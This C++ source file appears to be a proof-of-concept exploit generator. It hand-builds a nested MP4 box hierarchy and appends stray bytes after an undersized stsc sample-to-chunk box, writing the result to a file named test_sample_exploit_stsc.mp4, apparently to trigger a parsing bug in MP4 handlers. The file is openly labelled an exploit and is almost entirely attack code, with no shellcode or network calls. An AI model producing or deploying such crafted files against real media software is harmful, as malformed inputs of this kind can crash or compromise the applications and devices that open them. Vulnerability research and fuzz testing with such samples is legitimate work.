#include <cstring>
#include "make_exploit.h"
#include <cstdio>
#include <string>
#include <iostream>

// g++ -o make_exploit make_exploit.cpp
// ./make_exploit

void printArr(unsigned char arr[], int n) {
    for (int i =0; i<n; i++) {
        printf("%hhx\n", arr[i]);
    }
}

/*
 * name - box name
 * data - box data
 * res  - target byte array
 * size - box data size
 */
void make_box(char *name, unsigned char data[], unsigned char res[], int size) {
    for (int i = 4; i<8; i++) {
        res[i] = name[i-4];
    }
    int i = (size + 8);
    char v = i & 0xff;
    char v2 = (i>>8) & 0xff;
    char v3 = (i>>16) & 0xff;
    char v4 = (i>>24) & 0xff;

    res[3] = v;
    res[2] = v2;
    res[1] = v3;
    res[0] = v4;

    memcpy((res)+8, data, size);
}

 void make_exploit(const char *fileName) {
     int stsc_size = 3;
     unsigned char stsc_data[3] = {'a', 'b', 'c'};

     int stsc_box_size = stsc_size + 8;
     unsigned char stsc_box[stsc_box_size];
     make_box("stsc", stsc_data, stsc_box, stsc_size);

     int stsc_box_exploit_size = stsc_box_size + 10;
     unsigned char exploit[10] = {'c', 'v', 'e', 'e', 'x', 'p', 'l', 'o', 'i', 't'};
     unsigned char stsc_box_exploit[stsc_box_exploit_size];
     memcpy(stsc_box_exploit, stsc_box, stsc_box_size);
     memcpy(stsc_box_exploit+stsc_box_size, exploit, 10);
     printf("the stsc_exploit box \n");
     printArr(stsc_box_exploit, stsc_box_exploit_size);

     int stbl_size = stsc_box_exploit_size + 8;
     unsigned char stbl_box[stbl_size];
     make_box("stbl", stsc_box_exploit, stbl_box, stsc_box_exploit_size);

     int minf_size = stbl_size + 8;
     unsigned char minf_box[minf_size];
     make_box("minf", stbl_box, minf_box, stbl_size);

     int mdia_size = minf_size + 8;
     unsigned char mdia_box[mdia_size];
     make_box("mdia", minf_box, mdia_box, minf_size);

     int trak_size = mdia_size + 8;
     unsigned char trak_box[trak_size];
     make_box("trak", mdia_box, trak_box, mdia_size);

     int moov_size = trak_size + 8;
     unsigned char moov_box[moov_size];
     make_box("moov", trak_box, moov_box, trak_size);

     //printf("the final box \n");
     //printArr(moov_box, moov_size);

     FILE* fp = fopen(fileName, "w");
     fwrite(moov_box, 1, moov_size, fp);
     fclose(fp);
     printf("saved file: %s \n", fileName);
}

int main(int argc, char *argv[]) {
    make_exploit("test_sample_exploit_stsc.mp4");
}